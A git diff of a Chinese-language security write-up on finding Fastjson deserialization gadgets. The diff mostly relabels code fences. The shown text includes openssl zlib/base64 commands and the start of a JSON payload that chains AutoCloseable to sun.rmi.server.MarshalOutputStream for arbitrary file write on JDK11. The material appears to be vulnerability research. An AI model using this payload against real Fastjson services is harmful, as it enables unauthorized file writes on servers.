@@ -1303,16 +1303,19 @@ Gadget 寻找思路 (浅蓝师傅提供)：
 *   通过 set 方法或构造方法传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream
 *   需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法调用传入的 OutputStream 的 flush 方法  
     下面是个网络上公开的一个 Gadget，目前只适用于 JDK11 版本：  
-    ```java  
+    ```text
     $ echo -ne "RMB122 is here" | openssl zlib | base64 -w 0  
     eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==
+    ```
 
+```text
 $ echo -ne "RMB122 is here" | openssl zlib | wc -c  
 22
-
 ```
+
 载荷如何：
-```java
+
+```text
 {
     '@type':"java.lang.AutoCloseable",
     '@type':'sun.rmi.server.MarshalOutputStream',
